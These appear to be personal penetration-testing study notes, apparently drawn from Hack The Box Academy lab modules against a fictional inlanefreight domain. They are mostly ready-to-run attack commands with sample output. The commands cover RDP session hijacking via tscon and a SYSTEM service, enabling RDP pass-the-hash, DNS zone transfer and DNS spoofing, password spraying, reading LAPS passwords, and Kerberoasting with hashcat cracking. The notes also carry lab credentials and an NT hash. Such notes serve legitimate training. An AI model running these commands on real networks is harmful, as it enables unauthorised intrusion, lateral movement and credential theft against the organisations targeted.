+To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session). So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:
+
+tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+
+If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.
+
+C:\htb> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+ lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+
+C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+
+[SC] CreateService SUCCESS
+
+To run the command, we can start the sessionhijack service :
+net start sessionhijack
+
+Once the service is started, a new terminal with the lewen user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we'll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.
+
+Note: This method no longer works on Server 2019.
+
+
+RDP Pass-the-Hash (PtH)
+
+We may want to access applications or software installed on a user's Windows system that is only available with GUI access during a penetration test. If we have plaintext credentials for the target user, it will be no problem to RDP into the system. However, what if we only have the NT hash of the user obtained from a credential dumping attack such as SAM database, and we could not crack the hash to reveal the plaintext password? In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp.
+
+There are a few caveats to this attack:
+
+Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
+Account restrictions are preventing this user from seigin in...
+
+This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa. It can be done using the following command:
+C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+=====================
+DNS	
+
+DNS Zone Transfer
+A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. Since DNS comprises multiple DNS zones, DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. Unless a DNS server is configured correctly (limiting which IPs can perform a DNS zone transfer), anyone can ask a DNS server for a copy of its zone information since DNS zone transfers do not require any authentication. In addition, the DNS service usually runs on a UDP port; however, when performing DNS zone transfer, it uses a TCP port for reliable data transmission.
+
+An attacker could leverage this DNS zone transfer vulnerability to learn more about the target organization's DNS namespace, increasing the attack surface. For exploitation, we can use the dig utility with DNS query type AXFR option to dump the entire DNS namespaces from a vulnerable DNS server:
+
+dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
+
+; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
+;; global options: +cmd
+inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+inlanefrieght.htb.         604800  IN      AAAA    ::1
+inlanefrieght.htb.         604800  IN      NS      localhost.
+inlanefrieght.htb.         604800  IN      A       10.129.110.22
+admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
+hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
+support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
+inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 28 msec
+;; SERVER: 10.129.110.213#53(10.129.110.213)
+;; WHEN: Mon Oct 11 17:20:13 EDT 2020
+;; XFR size: 8 records (messages 1, bytes 289)
+
+Tools like Fierce can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:
+fierce --domain zonetransfer.me
+
+
+Local DNS Cache Poisoning
+From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap.
+
+To exploit the DNS cache poisoning via Ettercap, we should first edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to:
+
+  Attacking DNS
+Viyky7@htb[/htb]# cat /etc/ettercap/etter.dns
+
+inlanefreight.com      A   192.168.225.110
+*.inlanefreight.com    A   192.168.225.110
+Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
+Activate dns_spoof attack by navigating to Plugins > Manage Plugins. This sends the target machine with fake DNS responses that will resolve inlanefreight.com to IP address 192.168.225.110:
+
+subdomain takeover 
+Therefore, if an attacker finds a CNAME record in the company's DNS records that points to a subdomain that no longer exists and returns an HTTP 404 error, this subdomain can most likely be taken over by us through the use of the third-party provider. A subdomain takeover occurs when a subdomain points to another domain using the CNAME record that does not currently exist. When an attacker registers this nonexistent domain, the subdomain points to the domain registration by us. By making a single DNS change, we make ourselves the owner of that particular subdomain, and after that, we can manage the subdomain as we choose.
+
+=================
+Email
+
+user enumeration
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+
+========================
+ACTIVE DIRECTORY
+
+Internal Password Spraying from a Linux Host
+
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+
+We can also use Kerbrute for the same attack as discussed previously.
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+Local Admin Spraying with CrackMapExec
+Viyky7@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain. By default, without the local auth option set, the tool will attempt to authenticate using the current domain, which could quickly result in account lockouts.
+This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool Local Administrator Password Solution (LAPS) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.
+
+password spray from windows 
+
+ If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+There are several options available to us with the tool. Since the host is domain-joined, we will skip the -UserList flag and let the tool generate a list for us. We'll supply the Password flag and one single password and then use the -OutFile flag to write our output to a file for later use.
+
+PowerShell Constrained Language Mode
+PowerShell Constrained Language Mode locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.
+
+Enumerating Language Mode
+  Enumerating Security Controls
+PS C:\htb> $ExecutionContext.SessionState.LanguageMode
+
+ConstrainedLanguage
+
+
+LAPS
+
+The Microsoft Local Administrator Password Solution (LAPS) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. The LAPSToolkit greatly facilitates this with several functions. One is parsing ExtendedRights for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives All Extended Rights over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.
+
+PS C:\htb> Find-LAPSDelegatedGroups
+
+OrgUnit                                             Delegated Groups
+-------                                             ----------------
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\Domain Admins
+OU=Servers,DC=INLANEFREIGHT,DC=LOCAL                INLANEFREIGHT\LAPS Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\Domain Admins
+OU=Workstations,DC=INLANEFREIGHT,DC=LOCAL           INLANEFREIGHT\LAPS Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=Web Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\Domain Admins
+OU=SQL Servers,OU=Servers,DC=INLANEFREIGHT,DC=LOCAL INLANEFREIGHT\LAPS Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=File Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Contractor Laptops,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\Domain Admins
+OU=Staff Workstations,OU=Workstations,DC=INLANEF... INLANEFREIGHT\LAPS Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\Domain Admins
+OU=Executive Workstations,OU=Workstations,DC=INL... INLANEFREIGHT\LAPS Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\Domain Admins
+OU=Mail Servers,OU=Servers,DC=INLANEFREIGHT,DC=L... INLANEFREIGHT\LAPS Admins
+
+The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.
+
+PS C:\htb> Find-AdmPwdExtendedRights
+
+ComputerName                Identity                    Reason
+------------                --------                    ------
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
+EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
+SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
+WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
+
+We can use the Get-LAPSComputers function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.
+
+PS C:\htb> Get-LAPSComputers
+
+ComputerName                Password       Expiration
+------------                --------       ----------
+DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
+EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
+SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
+WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
+
+Credentialed Enumeration from linux
+
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+
+rpcclient -U "" -N 172.16.5.5
+
+rpcclient Enumeration
+While looking at users in rpcclient, you may notice a field called rid: beside each user. A Relative Identifier (RID) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:
+
+The SID for the INLANEFREIGHT.LOCAL domain is: S-1-5-21-3842939050-3880317879-2865463114.
+When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
+So the domain user htb-student with a RID:[0x457] Hex 0x457 would = decimal 1111, will have a full user SID of: S-1-5-21-3842939050-3880317879-2865463114-1111.
+This is unique to the htb-student object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.
+However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID [administrator] rid:[0x1f4], which, when converted to a decimal value, equals 500. The built-in Administrator account will always have the RID value Hex 0x1f4, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the htb-student user.
+
+RPCClient User Enumeration By RID
+rpcclient $> queryuser 0x457
+
+        User Name   :   htb-student
+        Full Name   :   Htb Student
+        Home Drive  :
+        Dir Drive   :
+        Profile Path:
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
+        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
+        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
+        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
+        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
+        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
+        unknown_2[0..31]...
+        user_rid :      0x457
+        group_rid:      0x201
+        acb_info :      0x00000010
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x0000001d
+        padding1[0..7]...
+        logon_hrs[0..21]...
+If we wished to enumerate all users to gather the RIDs for more than just one, we would use the enumdomusers command.
+
+Enumdomusers
+  Credentialed Enumeration - from Linux
+rpcclient $> enumdomusers
+
+user:[administrator] rid:[0x1f4]
+user:[guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[lab_adm] rid:[0x3e9]
+user:[htb-student] rid:[0x457]
+user:[avazquez] rid:[0x458]
+user:[pfalcon] rid:[0x459]
+user:[fanthony] rid:[0x45a]
+user:[wdillard] rid:[0x45b]
+user:[lbradford] rid:[0x45c]
+user:[sgage] rid:[0x45d]
+user:[asanchez] rid:[0x45e]
+user:[dbranch] rid:[0x45f]
+user:[ccruz] rid:[0x460]
+user:[njohnson] rid:[0x461]
+user:[mholliday] rid:[0x462]
+
+
+
+Using psexec.py
+
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+
+
+
+wmiexec.py
+Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.
+
+Using wmiexec.py
+Code: bash
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+
+Windapsearch
+Windapsearch is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.
+
+We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The --da (enumerate domain admins group members ) option and the -PU ( find privileged users) options. The -PU option is interesting because it will perform a recursive search for users with nested group membership.
+
+Viyky7@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]	...success! Binded as: 
+[+]	 u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all Domain Admins
+[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]	Found 28 Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+Windapsearch - Privileged Users
+
+Viyky7@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]     ...success! Binded as:
+[+]      u:INLANEFREIGHT\forend
+[+] Attempting to enumerate all AD privileged users
+[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 28 nested users for group Domain Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Angela Dunn
+userPrincipalName: adunn@inlanefreight.local
+
+cn: Matthew Morgan
+userPrincipalName: mmorgan@inlanefreight.local
+
+cn: Dorothy Click
+userPrincipalName: dclick@inlanefreight.local
+
+<SNIP>
+
+[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[+]     Found 3 nested users for group Enterprise Admins:
+
+cn: Administrator
+userPrincipalName: administrator@inlanefreight.local
+
+cn: lab_adm
+
+cn: Sharepoint Admin
+userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL
+
+Bloodhound.py
+
+It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, ldap3, and dnspython) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).
+
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+
+
+
+Credential enumeration from Windows 
+
+
+SharpHound in Action
+.\SharpHound.exe -c All --zipfilename ILFREIGHT
+
+ActiveDirectory PowerShell Module
+PS C:\htb> Get-Module
+
+PS C:\htb> Import-Module ActiveDirectory
+PS C:\htb> Get-Module
+
+This will print out helpful information like the domain SID, domain functional level, any child domains, and more. Next, we'll use the Get-ADUser cmdlet. We will be filtering for accounts with the ServicePrincipalName property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack, which we will cover in-depth after the next section.
+
+Get-ADUser
+  Credentialed Enumeration - from Windows
+PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+Enabled              : True
+GivenName            : Sharepoint
+Name                 : adfs
+ObjectClass          : user
+ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
+SamAccountName       : adfs
+ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
+SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
+Surname              : Admin
+UserPrincipalName    :
+
+DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+Enabled              : True
+GivenName            : Jessica
+Name                 : BACKUPAGENT
+ObjectClass          : user
+ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
+SamAccountName       : backupagent
+ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
+SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
+Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
+UserPrincipalName    :
+
+Group Enumeration
+  Credentialed Enumeration - from Windows
+PS C:\htb> Get-ADGroup -Filter * | select name
+
+name
+----
+Administrators
+Users
+Guests
+Print Operators
+Backup Operators
+Replicator
+Remote Desktop Users
+Network Configuration Operators
+Performance Monitor Users
+Performance Log Users
+Distributed COM Users
+IIS_IUSRS
+Cryptographic Operators
+Event Log Readers
+Certificate Service DCOM Access
+RDS Remote Access Servers
+RDS Endpoint Servers
+RDS Management Servers
+Hyper-V Administrators
+Access Control Assistance Operators
+Remote Management Users
+Storage Replica Administrators
+Domain Computers
+Domain Controllers
+Schema Admins
+Enterprise Admins
+Cert Publishers
+Domain Admins
+
+We can take the results and feed interesting names back into the cmdlet to get more detailed information about a particular group like so:
+
+Detailed Group Info
+  Credentialed Enumeration - from Windows
+PS C:\htb> Get-ADGroup -Identity "Backup Operators"
+
+DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
+GroupCategory     : Security
+GroupScope        : DomainLocal
+Name              : Backup Operators
+ObjectClass       : group
+ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
+SamAccountName    : Backup Operators
+SID               : S-1-5-32-551
+
+Now that we know more about the group, let's get a member listing using the Get-ADGroupMember cmdlet.
+
+Group Membership
+  Credentialed Enumeration - from Windows
+PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
+
+distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+name              : BACKUPAGENT
+objectClass       : user
+objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
+SamAccountName    : backupagent
+SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
+
+
+powerview
+
+Now we can check for users with the SPN attribute set, which indicates that the account may be subjected to a Kerberoasting attack.
+
+Finding Users With SPN Set
+  Credentialed Enumeration - from Windows
+PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
+serviceprincipalname                          samaccountname
+--------------------                          --------------
+adfsconnect/azure01.inlanefreight.local       adfs
+backupjob/veam001.inlanefreight.local         backupagent
+d0wngrade/kerberoast.inlanefreight.local      d0wngrade
+kadmin/changepw                               krbtgt
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
+MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
+MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
+sts/inlanefreight.local                       solarwindsmonitor
+testspn/kerberoast.inlanefreight.local        testspn
+testspn2/kerberoast.inlanefreight.local       testspn2
+
+Recursive Group Membership
+  Credentialed Enumeration - from Windows
+PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+Domain User Information
+  Credentialed Enumeration - from Windows
+PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+
+
+Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This cheatsheet has some useful commands for querying host and domain info using wmic.
+
+PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+
+Caption          Description      DnsForestName           DomainControllerAddress  DomainName
+ACADEMY-EA-MS01  ACADEMY-EA-MS01
+INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
+LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
+FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
+
+Listing SPN Accounts with GetUserSPNs.py
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+
+We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
+
+Requesting all TGS Tickets
+  Kerberoasting - from Linux
+Viyky7@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+
+We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
+
+Requesting a Single TGS ticket
+  Kerberoasting - from Linux
+Viyky7@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+
+Saving the TGS Ticket to an Output File
+  Kerberoasting - from Linux
+Viyky7@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
+
+kerberoasting from windows 
+
+Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in setspn binary to enumerate SPNs in the domain.
+
+Enumerating SPNs with setspn.exe
+  Kerberoasting - from Windows
+C:\htb> setspn.exe -Q */*
+Checking domain DC=INLANEFREIGHT,DC=LOCAL
+CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
+        exchangeAB/ACADEMY-EA-DC01
+        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        TERMSRV/ACADEMY-EA-DC01
+        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
+        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL
+
+<SNIP>
+
+CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        backupjob/veam001.inlanefreight.local
+CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        sts/inlanefreight.local
+
+<SNIP>
+
+CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SPSJDB.inlanefreight.local:1433
+CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
+CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+        adfsconnect/azure01.inlanefreight.local
+
+Existing SPN found!
+
+We will notice many different SPNs returned for the various hosts in the domain. We will focus on user accounts and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz. Let's try this by targeting a single user:
+
+Targeting a Single User
+  Kerberoasting - from Windows
+PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:36:22 PM
+ValidTo              : 2/25/2022 8:55:25 AM
+ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):
+
+The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
+The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
+System.IdentityModel is a namespace that contains different classes for building security token services
+We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
+We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
+We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.
+
+Retrieving All Tickets Using setspn.exe
+  Kerberoasting - from Windows
+PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:56:18 PM
+ValidTo              : 2/25/2022 8:55:25 AM
+ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:56:18 PM
+ValidTo              : 2/24/2022 11:58:18 PM
+ServicePrincipalName : kadmin/changepw
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
